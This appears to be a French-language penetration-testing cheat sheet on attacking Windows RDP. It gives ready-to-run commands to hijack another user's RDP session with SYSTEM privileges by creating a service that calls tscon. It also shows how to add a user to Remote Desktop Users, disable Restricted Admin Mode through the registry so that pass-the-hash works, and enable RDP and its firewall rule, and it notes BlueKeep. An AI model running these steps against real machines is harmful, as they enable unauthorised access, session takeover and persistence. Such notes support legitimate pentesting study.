
- [ ] [[#1. Bruteforce]]
- [ ] [[#2. Session Hijacking (SYSTEM priv)]]
- [ ] [[#3. Pass The Hash Pass The Hash (PtH) XFREERDP]]
- [ ] [[#4. Ajouter un user au groupe RDP]]
- [ ] [[#5. CVEs]]


---

# 1. Bruteforce

[[Bruteforce en ligne#RDP]]


---

# 2. Session Hijacking (SYSTEM priv)

> [!IMPORTANT]
> Ejecte l'utilisateur de la session

Afficher les sessions

```Powershell
query user
```

Création du service 'sessionhijack'

```Powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <id_cible> /dest:<OUR_SESSION_NAME>"
```

Exécution du service

```cmd-session
net start sessionhijack
```


---

# 3. Pass The Hash [[Pass The Hash (PtH)#XFREERDP]]


---

# 4. Ajouter un user au groupe RDP


```cmd
net localgroup "Remote Desktop Users" UserLoginName /add
```

Désactiver le Restricted Admin Mode sur la target

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

# 5. Activer RDP sur machine


https://www.airdroid.com/quick-guides/powershell-enable-rdp/

```
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 'fDenyTSConnections' -value 0
```

```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```



---
# 6. CVEs


## BlueKeep ([CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708))

Use After Free

> [!IMPORTANT]
> Peut causer des BSOD

## SYSTÈMES AFFECTÉS

- Windows 2003
- Windows 7
- Windows Server 2008
- Windows Server 2008 R2
- Windows Vista
- Windows XP